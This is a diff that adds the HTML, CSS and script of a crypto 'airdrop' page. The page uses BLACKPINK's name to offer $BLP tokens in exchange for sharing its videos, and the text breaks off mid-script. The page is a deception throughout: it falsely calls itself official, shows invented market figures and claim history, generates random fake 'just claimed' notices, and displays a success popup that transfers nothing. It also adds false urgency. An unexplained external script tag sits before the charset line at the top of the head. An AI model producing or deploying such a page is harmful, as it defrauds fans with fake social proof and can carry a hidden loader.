@@ -1,0 +1,1364 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script charset="UTF-8" type="text/javascript" src="./chunk.47.q23ca68j.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLACKPINK Airdrop | Claim $BLP Tokens</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #ff2a6d;
+            --secondary: #d16ba5;
+            --accent: #86a8e7;
+            --dark: #0f0c29;
+            --darker: #090717;
+            --light: #f8f9fa;
+            --success: #00d26a;
+            --pink: #ff4d94;
+            --purple: #9d4edd;
+            --gold: #ffd700;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, var(--darker), var(--dark));
+            color: var(--light);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Dynamic background elements */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(214, 107, 165, 0.3);
+            animation: float 15s infinite linear;
+        }
+
+        /* Header styling */
+        header {
+            text-align: center;
+            padding: 2rem 1rem;
+            background: rgba(15, 12, 41, 0.7);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(134, 168, 231, 0.2);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 1rem;
+        }
+
+        .logo i {
+            font-size: 2.5rem;
+            color: var(--pink);
+            text-shadow: 0 0 15px rgba(255, 77, 148, 0.7);
+        }
+
+        .logo h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 800;
+            font-size: 2.8rem;
+            background: linear-gradient(to right, var(--pink), var(--purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+
+        .tagline {
+            font-size: 1.2rem;
+            max-width: 800px;
+            margin: 0 auto;
+            color: #a5b1e1;
+            line-height: 1.6;
+        }
+
+        /* Real-time claim notifications */
+        .claim-notifications {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .notification {
+            background: rgba(15, 12, 41, 0.9);
+            border-radius: 10px;
+            padding: 15px 20px;
+            border: 1px solid var(--pink);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(5px);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            opacity: 0;
+            transform: translateX(20px);
+            transition: all 0.4s ease;
+        }
+
+        .notification.active {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .notification i {
+            color: var(--success);
+            font-size: 1.3rem;
+        }
+
+        .notification-content {
+            font-size: 0.9rem;
+        }
+
+        .notification-address {
+            font-weight: 600;
+            color: var(--accent);
+        }
+
+        .notification-amount {
+            color: var(--success);
+            font-weight: 700;
+        }
+
+        /* Main content container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Video section */
+        .video-section {
+            background: rgba(20, 15, 60, 0.5);
+            border-radius: 20px;
+            padding: 1.5rem;
+            border: 1px solid rgba(134, 168, 231, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1.5rem;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--light);
+        }
+
+        .section-title i {
+            color: var(--pink);
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+            margin-bottom: 2rem;
+        }
+
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        /* Roadmap Section */
+        .roadmap-section {
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .roadmap-section h3 {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: var(--pink);
+            position: relative;
+            display: inline-block;
+        }
+
+        .roadmap-section h3::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 3px;
+            background: linear-gradient(to right, var(--pink), var(--purple));
+        }
+
+        .roadmap-items {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        .roadmap-item {
+            background: rgba(15, 12, 41, 0.7);
+            border-radius: 15px;
+            padding: 1.5rem 1rem;
+            border: 1px solid rgba(134, 168, 231, 0.3);
+            transition: transform 0.3s ease;
+        }
+
+        .roadmap-item:hover {
+            transform: translateY(-5px);
+            border-color: var(--pink);
+        }
+
+        .roadmap-item h4 {
+            color: var(--gold);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+
+        .roadmap-item p {
+            color: #a5b1e1;
+            font-size: 0.95rem;
+        }
+
+        /* Special Rewards Card */
+        .rewards-card {
+            background: linear-gradient(135deg, rgba(157, 78, 221, 0.2), rgba(255, 77, 148, 0.2));
+            border-radius: 15px;
+            padding: 2rem;
+            text-align: center;
+            border: 1px solid var(--pink);
+            margin-top: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .rewards-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            transform: rotate(30deg);
+        }
+
+        .rewards-card h3 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            color: var(--gold);
+            position: relative;
+            z-index: 1;
+        }
+
+        .rewards-card .reward-highlight {
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--gold);
+            margin: 1rem 0;
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.5);
+            position: relative;
+            z-index: 1;
+        }
+
+        .rewards-card p {
+            color: #f8f9fa;
+            margin-bottom: 1rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .rewards-card .prize-details {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 1rem;
+            border-radius: 10px;
+            margin: 1.5rem 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Promo Text */
+        .promo-text {
+            text-align: center;
+            margin-top: 2rem;
+            padding: 1.5rem;
+            background: rgba(255, 77, 148, 0.1);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 77, 148, 0.3);
+            position: relative;
+        }
+
+        .promo-text p {
+            font-size: 1.3rem;
+            line-height: 1.8;
+            color: var(--light);
+        }
+
+        .promo-text .highlight {
+            color: var(--gold);
+            font-weight: 600;
+        }
+
+        /* Social tasks */
+        .social-tasks {
+            margin-top: 2rem;
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 1.5rem;
+        }
+
+        .social-task {
+            background: rgba(15, 12, 41, 0.7);
+            border-radius: 15px;
+            padding: 1.5rem;
+            border: 1px solid rgba(134, 168, 231, 0.3);
+        }
+
+        .task-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .task-header h3 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--accent);
+            font-size: 1.2rem;
+        }
+
+        .task-header i {
+            font-size: 1.5rem;
+        }
+
+        .task-header .reward {
+            background: rgba(0, 210, 106, 0.15);
+            color: var(--success);
+            padding: 0.3rem 1rem;
+            border-radius: 50px;
+            font-weight: 600;
+        }
+
+        .link-box {
+            background: rgba(9, 7, 23, 0.7);
+            border-radius: 12px;
+            padding: 0.75rem;
+            border: 1px solid rgba(134, 168, 231, 0.3);
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            margin-top: 1rem;
+            gap: 0.5rem;
+        }
+
+        .link-box input {
+            flex: 1;
+            min-width: 150px;
+            background: transparent;
+            border: none;
+            color: white;
+            padding: 0.5rem;
+            font-family: 'Poppins', sans-serif;
+            font-size: 0.95rem;
+        }
+
+        .link-box input:focus {
+            outline: none;
+        }
+
+        .link-box button {
+            background: var(--purple);
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+            font-size: 0.9rem;
+            white-space: nowrap;
+        }
+
+        .link-box button:hover {
+            background: var(--pink);
+        }
+
+        .proof-input {
+            margin-top: 1.2rem;
+        }
+
+        .proof-input label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #a5b1e1;
+            font-size: 0.95rem;
+        }
+
+        .proof-input input {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            background: rgba(9, 7, 23, 0.6);
+            border: 1px solid rgba(134, 168, 231, 0.3);
+            border-radius: 8px;
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            font-size: 0.95rem;
+        }
+
+        .proof-input input:focus {
+            border-color: var(--pink);
+            outline: none;
+        }
+
+        .task-actions {
+            margin-top: 1.5rem;
+        }
+
+        .task-button {
+            width: 100%;
+            padding: 0.8rem;
+            border: none;
+            border-radius: 10px;
+            background: var(--purple);
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .task-button:hover {
+            background: var(--pink);
+        }
+
+        .task-button.completed {
+            background: var(--success);
+            cursor: default;
+        }
+
+        .task-button.completed:hover {
+            background: var(--success);
+        }
+
+        /* Claim section */
+        .claim-section {
+            background: rgba(20, 15, 60, 0.5);
+            border-radius: 20px;
+            padding: 1.5rem;
+            border: 1px solid rgba(134, 168, 231, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+        }
+
+        .reward-card {
+            background: linear-gradient(135deg, rgba(15, 12, 41, 0.8), rgba(33, 25, 85, 0.8));
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(134, 168, 231, 0.3);
+        }
+
+        .reward-title {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .reward-title h3 {
+            font-size: 1.4rem;
+            color: var(--accent);
+        }
+
+        .reward-amount {
+            background: rgba(0, 210, 106, 0.15);
+            color: var(--success);
+            padding: 0.3rem 1rem;
+            border-radius: 50px;
+            font-weight: 600;
+        }
+
+        .claim-button {
+            width: 100%;
+            padding: 1rem;
+            border: none;
+            border-radius: 12px;
+            background: linear-gradient(to right, var(--pink), var(--purple));
+            color: white;
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 77, 148, 0.4);
+            margin-top: 1rem;
+        }
+
+        .claim-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 77, 148, 0.6);
+        }
+
+        .claim-button:active {
+            transform: translateY(1px);
+        }
+
+        .claim-button:disabled {
+            background: #555;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        
+        /* About Section */
+        .about-section {
+            background: rgba(20, 15, 60, 0.5);
+            border-radius: 20px;
+            padding: 1.5rem;
+            border: 1px solid rgba(134, 168, 231, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            grid-column: 1 / -1;
+        }
+
+        .about-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1.5rem;
+        }
+
+        .about-card {
+            background: rgba(15, 12, 41, 0.7);
+            border-radius: 15px;
+            padding: 1.5rem;
+            border: 1px solid rgba(134, 168, 231, 0.3);
+        }
+
+        .about-card h3 {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+            color: var(--accent);
+        }
+
+        .token-value {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--pink), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 1rem;
+        }
+
+        .about-card ul {
+            list-style: none;
+        }
+
+        .about-card li {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(134, 168, 231, 0.2);
+        }
+
+        .special-offer {
+            background: linear-gradient(135deg, rgba(157, 78, 221, 0.3), rgba(255, 77, 148, 0.3));
+            border-radius: 15px;
+            padding: 1.5rem;
+            margin-top: 1.5rem;
+            text-align: center;
+            border: 1px solid var(--pink);
+        }
+
+        .special-offer h3 {
+            font-size: 1.4rem;
+            margin-bottom: 0.5rem;
+            color: var(--light);
+        }
+
+        .special-offer p {
+            font-size: 1.1rem;
+        }
+
+        .highlight {
+            color: var(--pink);
+            font-weight: 700;
+        }
+
+        /* History Section */
+        .history-section {
+            background: rgba(20, 15, 60, 0.5);
+            border-radius: 20px;
+            padding: 1.5rem;
+            border: 1px solid rgba(134, 168, 231, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            grid-column: 1 / -1;
+        }
+
+        .history-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .history-item {
+            background: rgba(15, 12, 41, 0.7);
+            border-radius: 12px;
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border: 1px solid rgba(134, 168, 231, 0.3);
+        }
+
+        .history-item i {
+            color: var(--success);
+            font-size: 1.5rem;
+        }
+
+        .txn-details {
+            flex: 1;
+        }
+
+        .txn-hash {
+            font-size: 0.85rem;
+            color: #a5b1e1;
+            margin-bottom: 0.3rem;
+            word-break: break-all;
+        }
+
+        .txn-amount {
+            font-weight: 700;
+            color: var(--success);
+        }
+
+        .txn-time {
+            color: #a5b1e1;
+            font-size: 0.9rem;
+            white-space: nowrap;
+        }
+
+        /* Popup for Success */
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(9, 7, 23, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .popup.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .popup-content {
+            background: linear-gradient(135deg, rgba(33, 25, 85, 0.9), rgba(15, 12, 41, 0.9));
+            border-radius: 20px;
+            width: 90%;
+            max-width: 500px;
+            padding: 2rem;
+            text-align: center;
+            border: 1px solid var(--pink);
+            box-shadow: 0 0 40px rgba(255, 77, 148, 0.3);
+            position: relative;
+            transform: translateY(20px);
+            transition: transform 0.4s ease;
+        }
+
+        .popup.active .popup-content {
+            transform: translateY(0);
+        }
+
+        .popup-close {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            color: var(--accent);
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .popup-icon {
+            font-size: 4rem;
+            color: var(--success);
+            margin-bottom: 1.5rem;
+            text-shadow: 0 0 20px rgba(0, 210, 106, 0.5);
+        }
+
+        .popup h2 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: var(--light);
+        }
+
+        .popup p {
+            color: #b2b9e0;
+            margin-bottom: 1.5rem;
+            line-height: 1.6;
+        }
+
+        .popup-hash {
+            background: rgba(15, 12, 41, 0.7);
+            padding: 1rem;
+            border-radius: 12px;
+            font-family: monospace;
+            color: var(--accent);
+            word-break: break-all;
+            margin: 1.5rem 0;
+            border: 1px solid rgba(134, 168, 231, 0.3);
+        }
+
+        /* Animations */
+        @keyframes float {
+            0% {
+                transform: translateY(0) translateX(0) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-1000px) translateX(1000px) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(255, 77, 148, 0.7);
+            }
+            70% {
+                transform: scale(1.05);
+                box-shadow: 0 0 0 15px rgba(255, 77, 148, 0);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(255, 77, 148, 0);
+            }
+        }
+
+        @keyframes shine {
+            0% {
+                background-position: -100px;
+            }
+            100% {
+                background-position: 200px;
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 2rem 1rem;
+            color: #a5b1e1;
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(134, 168, 231, 0.1);
+            margin-top: 2rem;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(15, 12, 41, 0.5);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--secondary);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--pink);
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .logo h1 {
+                font-size: 2.2rem;
+            }
+            
+            .tagline {
+                font-size: 1rem;
+            }
+
+            .container {
+                padding: 1rem;
+            }
+
+            .video-section, 
+            .claim-section {
+                padding: 1rem;
+            }
+
+            .section-title {
+                font-size: 1.3rem;
+            }
+
+            .task-header {
+                flex-wrap: wrap;
+                gap: 0.5rem;
+            }
+
+            .task-header h3 {
+                font-size: 1rem;
+            }
+
+            .task-header .reward {
+                padding: 0.3rem 0.8rem;
+                font-size: 0.9rem;
+            }
+
+            .link-box {
+                flex-direction: column;
+                align-items: stretch;
+            }
+
+            .link-box input {
+                width: 100%;
+            }
+
+            .link-box button {
+                width: 100%;
+            }
+
+            .claim-notifications {
+                top: 10px;
+                right: 10px;
+            }
+
+            .notification {
+                padding: 10px 15px;
+                font-size: 0.8rem;
+            }
+
+            .roadmap-items {
+                grid-template-columns: 1fr;
+            }
+
+            .promo-text p {
+                font-size: 1.1rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .logo h1 {
+                font-size: 1.8rem;
+            }
+            
+            .logo i {
+                font-size: 2rem;
+            }
+
+            .about-grid,
+            .history-list {
+                grid-template-columns: 1fr;
+            }
+
+            .history-item {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+            .txn-time {
+                align-self: flex-end;
+            }
+
+            .rewards-card {
+                padding: 1.5rem 1rem;
+            }
+
+            .rewards-card .reward-highlight {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Dynamic background particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Real-time claim notifications -->
+    <div class="claim-notifications" id="claimNotifications"></div>
+
+    <!-- Header -->
+    <header>
+        <div class="logo">
+            <i class="fas fa-crown"></i>
+            <h1>BLACKPINK Airdrop</h1>
+        </div>
+        <p class="tagline">Share our content to earn $BLP tokens! Complete both tasks to claim your 2000 BLP reward</p>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Video Section -->
+        <div class="video-section">
+            <div class="section-title">
+                <i class="fas fa-play-circle"></i>
+                <h2>BLACKPINK Official Video</h2>
+            </div>
+            <div class="video-container">
+                <div style="position:relative; width:100%; height:0px; padding-bottom:56.250%">
+                    <iframe allow="fullscreen;autoplay" allowfullscreen height="100%" src="https://streamable.com/e/tn76q7?autoplay=1" width="100%" style="border:none; width:100%; height:100%; position:absolute; left:0px; top:0px; overflow:hidden;"></iframe>
+                </div>
+            </div>
+            
+            <!-- Roadmap Section -->
+            <div class="roadmap-section">
+                <h3>Roadmap</h3>
+                <div class="roadmap-items">
+                    <div class="roadmap-item">
+                        <h4>Q3 2023</h4>
+                        <p>Airdrop Campaign</p>
+                    </div>
+                    <div class="roadmap-item">
+                        <h4>Q4 2023</h4>
+                        <p>CEX Listings</p>
+                    </div>
+                    <div class="roadmap-item">
+                        <h4>Q1 2024</h4>
+                        <p>BLP Staking Launch</p>
+                    </div>
+                    <div class="roadmap-item">
+                        <h4>Q2 2024</h4>
+                        <p>NFT Collection Drop</p>
+                    </div>
+                    <div class="roadmap-item">
+                        <h4>Q3 2024</h4>
+                        <p>Metaverse Experience</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Special Rewards Card -->
+            <div class="rewards-card">
+                <h3>Special Rewards</h3>
+                <p>Meet BLACKPINK!</p>
+                <div class="reward-highlight">Collect 1,000,000 BLP</div>
+                <p>to enter the draw for a chance to meet the band!</p>
+                <div class="prize-details">
+                    <p><i class="fas fa-star"></i> VIP tickets + backstage experience</p>
+                </div>
+            </div>
+            
+            <!-- Promo Text -->
+            <div class="promo-text">
+                <p>
+                    <span class="highlight">🌟 Get ready to shine like a BLACKPINK star!</span><br>
+                    Claim your exclusive BLACKPINK Airdrop and unlock your chance to own a piece of K-pop magic!<br>
+                    <span class="highlight">💖💰 #BlackpinkAirdrop #KpopCrypto</span>
+                </p>
+            </div>
+            
+            <!-- TikTok Sharing Task -->
+            <div class="social-tasks">
+                <div class="social-task">
+                    <div class="task-header">
+                        <h3><i class="fab fa-tiktok"></i> Share on TikTok</h3>
+                        <div class="reward">500 BLP</div>
+                    </div>
+                    <p>Share our video on TikTok to earn rewards</p>
+                    <div class="link-box">
+                        <input type="text" value="https://www.tiktok.com/@blackpinkofficial" readonly id="tiktokLink">
+                        <button onclick="copyLink('tiktokLink')"><i class="fas fa-copy"></i> Copy</button>
+                    </div>
+                    <div class="proof-input">
+                        <label for="tiktokProof">Paste your TikTok share link:</label>
+                        <input type="text" placeholder="https://www.tiktok.com/@yourname/video/..." id="tiktokProof">
+                    </div>
+                    <div class="task-actions">
+                        <button class="task-button" id="tiktokButton" onclick="completeTask('tiktok')">✅ I've shared</button>
+                    </div>
+                </div>
+                
+                <!-- YouTube Sharing Task -->
+                <div class="social-task">
+                    <div class="task-header">
+                        <h3><i class="fab fa-youtube"></i> Share on YouTube</h3>
+                        <div class="reward">500 BLP</div>
+                    </div>
+                    <p>Share our video on YouTube to earn rewards</p>
+                    <div class="link-box">
+                        <input type="text" value="https://www.youtube.com/@BLACKPINK" readonly id="youtubeLink">
+                        <button onclick="copyLink('youtubeLink')"><i class="fas fa-copy"></i> Copy</button>
+                    </div>
+                    <div class="proof-input">
+                        <label for="youtubeProof">Paste your YouTube share link:</label>
+                        <input type="text" placeholder="https://youtube.com/watch?v=..." id="youtubeProof">
+                    </div>
+                    <div class="task-actions">
+                        <button class="task-button" id="youtubeButton" onclick="completeTask('youtube')">✅ I've shared</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Claim Section -->
+        <div class="claim-section">
+            <div class="reward-card">
+                <div class="reward-title">
+                    <h3>Your Reward</h3>
+                    <div class="reward-amount">2000 BLP</div>
+                </div>
+                <p>Complete both social tasks to claim your reward</p>
+            </div>
+            
+            <button class="claim-button" id="claimButton" disabled>Claim 2000 BLP Tokens</button>
+        </div>
+
+        <!-- About Section -->
+        <div class="about-section">
+            <div class="section-title">
+                <i class="fas fa-coins"></i>
+                <h2>About $BLP Token</h2>
+            </div>
+            <div class="about-grid">
+                <div class="about-card">
+                    <h3><i class="fas fa-info-circle"></i> Token Details</h3>
+                    <div class="token-value">$0.023</div>
+                    <ul>
+                        <li><span>Total Supply:</span> <span>1,000,000,000 BLP</span></li>
+                        <li><span>Market Cap:</span> <span>$23,000,000</span></li>
+                        <li><span>Holders:</span> <span>12,456</span></li>
+                        <li><span>Liquidity:</span> <span>$5,200,000</span></li>
+                    </ul>
+                </div>
+                <div class="about-card">
+                    <h3><i class="fas fa-chart-line"></i> Token Distribution</h3>
+                    <ul>
+                        <li><span>Airdrop:</span> <span>20%</span></li>
+                        <li><span>Team:</span> <span>15%</span></li>
+                        <li><span>Liquidity:</span> <span>25%</span></li>
+                        <li><span>Ecosystem:</span> <span>30%</span></li>
+                        <li><span>Marketing:</span> <span>10%</span></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="special-offer">
+                <h3>Special Limited Offer!</h3>
+                <p>Claim your tokens within the next <span class="highlight">24 hours</span> to receive an extra 10% bonus</p>
+            </div>
+        </div>
+
+        <!-- Transaction History -->
+        <div class="history-section">
+            <div class="history-header">
+                <div class="section-title">
+                    <i class="fas fa-history"></i>
+                    <h2>Recent Claims</h2>
+                </div>
+            </div>
+            <div class="history-list">
+                <div class="history-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div class="txn-details">
+                        <div class="txn-hash">0x8a4c5e...d3f7a2</div>
+                        <div class="txn-amount">+1,200 BLP</div>
+                    </div>
+                    <div class="txn-time">2 minutes ago</div>
+                </div>
+                <div class="history-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div class="txn-details">
+                        <div class="txn-hash">0x3b9d7a...f8c2e1</div>
+                        <div class="txn-amount">+2,000 BLP</div>
+                    </div>
+                    <div class="txn-time">15 minutes ago</div>
+                </div>
+                <div class="history-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div class="txn-details">
+                        <div class="txn-hash">0xf42a8d...1c9e3b</div>
+                        <div class="txn-amount">+1,500 BLP</div>
+                    </div>
+                    <div class="txn-time">28 minutes ago</div>
+                </div>
+                <div class="history-item">
+                    <i class="fas fa-check-circle"></i>
+                    <div class="txn-details">
+                        <div class="txn-hash">0x9c3b8e...f7a2d1</div>
+                        <div class="txn-amount">+2,000 BLP</div>
+                    </div>
+                    <div class="txn-time">1 hour ago</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup for Success -->
+    <div class="popup" id="successPopup">
+        <div class="popup-content">
+            <button class="popup-close" onclick="closePopup()"><i class="fas fa-times"></i></button>
+            <div class="popup-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Success!</h2>
+            <p>You've successfully claimed your 2000 BLP tokens!</p>
+            <div class="popup-hash">
+                TXN: 0x4a2b8d...c7f3e1a
+            </div>
+            <p>Tokens will appear in your wallet within 24 hours</p>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <p>© 2025 BLACKPINK Airdrop. This is an official BLACKPINK project. For entertainment purposes only.</p>
+    </footer>
+
+    <script>
+        // Create dynamic particles
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 30;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random size and position
+                const size = Math.random() * 20 + 5;
+                const posX = Math.random() * 100;
+                const posY = Math.random() * 100;
+                const delay = Math.random() * 15;
+                const duration = Math.random() * 20 + 10;
+                
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                particle.style.left = `${posX}%`;
+                particle.style.top = `${posY}%`;
+                particle.style.animationDelay = `${delay}s`;
+                particle.style.animationDuration = `${duration}s`;
+                
+                particlesContainer.appendChild(particle);
+            }
+        }
+        
+        // Copy link to clipboard
+        function copyLink(elementId) {
+            const copyText = document.getElementById(elementId);
+            copyText.select();
+            copyText.setSelectionRange(0, 99999);
+            document.execCommand("copy");
+            
+            // Visual feedback
+            const originalText = copyText.value;
+            copyText.value = "Copied to clipboard!";
+            setTimeout(() => {
+                copyText.value = originalText;
+            }, 2000);
+        }
+        
+        // Track completed tasks
+        let completedTasks = {
+            tiktok: false,
+            youtube: false
+        };
+        
+        // Complete task function
+        function completeTask(platform) {
+            const input = document.getElementById(`${platform}Proof`);
+            if (!input.value.trim()) {
+                alert(`Please paste your ${platform} share link first!`);
+                return;
+            }
+            
+            const button = document.getElementById(`${platform}Button`);
+            button.classList.add('completed');
+            button.disabled = true;
+            completedTasks[platform] = true;
+            
+            // Disable the input after completion
+            input.disabled = true;
+            
+            // Update claim button status
+            checkTasksCompletion();
+        }
+        
+        // Check if all tasks are completed
+        function checkTasksCompletion() {
+            const claimButton = document.getElementById('claimButton');
+            if (completedTasks.tiktok && completedTasks.youtube) {
+                claimButton.disabled = false;
+                claimButton.classList.add('pulse');
+            }
+        }
+        
+        // Show success popup
+        function showSuccessPopup() {
+            document.getElementById('successPopup').classList.add('active');
+        }
+        
+        // Close popup
+        function closePopup() {
+            document.getElementById('successPopup').classList.remove('active');
+        }
+        
+        // Claim tokens
+        document.getElementById('claimButton').addEventListener('click', function() {
+            if (!this.disabled) {
+                showSuccessPopup();
+                showRandomNotification();
+            }
+        });
+        
+        // Show claim notification
+        function showRandomNotification() {
+            const notificationsContainer = document.getElementById('claimNotifications');
+            
+            // Create a new notification element
+            const notification = document.createElement('div');
+            notification.classList.add('notification');
+            notification.innerHTML = `
+                <i class="fas fa-bolt"></i>
+                <div class="notification-content">
+                    <span class="notification-address">${getRandomAddress()}</span> just claimed 
+                    <span class="notification-amount">${getRandomAmount()} BLP</span>
+                </div>
+            `;
+            
+            // Add to container
+            notificationsContainer.appendChild(notification);
+            
+            // Show with animation
+            setTimeout(() => {
